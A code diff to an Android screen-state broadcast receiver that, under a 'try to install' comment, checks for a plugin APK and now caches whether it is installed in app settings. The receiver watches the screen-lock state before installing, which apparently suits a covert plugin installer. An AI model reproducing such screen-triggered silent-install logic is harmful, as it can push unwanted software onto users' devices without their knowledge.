@@ -6,6 +6,7 @@ import android.content.Intent;
 import com.plugin.common.utils.SingleInstanceBase;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.qm.*;
+import com.xstd.qm.setting.SettingManager;
 
 /**
  * Created with IntelliJ IDEA.
@@ -29,7 +30,17 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                                 + " function screen status : " + UtilsRuntime.isScreenLocked(context));
 
                 //try to install
-                boolean pluginInstalled = SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
+                SettingManager.getInstance().init(context);
+                if (!SettingManager.getInstance().getKeyPluginInstalled()
+                    && !SettingManager.getInstance().getKeyHasScaned()) {
+                    boolean installed = SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
+                    SettingManager.getInstance().setKeyPluginInstalled(installed);
+                    SettingManager.getInstance().setKeyHasScaned(true);
+                }
+
+                boolean pluginInstalled = SettingManager.getInstance().getKeyPluginInstalled();
+//                                            ? true
+//                                            : SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
                 if (UtilOperator.isPluginApkExist()
                         /**&& !UtilsRuntime.isPackageHasInstalled(context, Config.PLUGIN_PACKAGE_NAME)**/
                         && !pluginInstalled) {
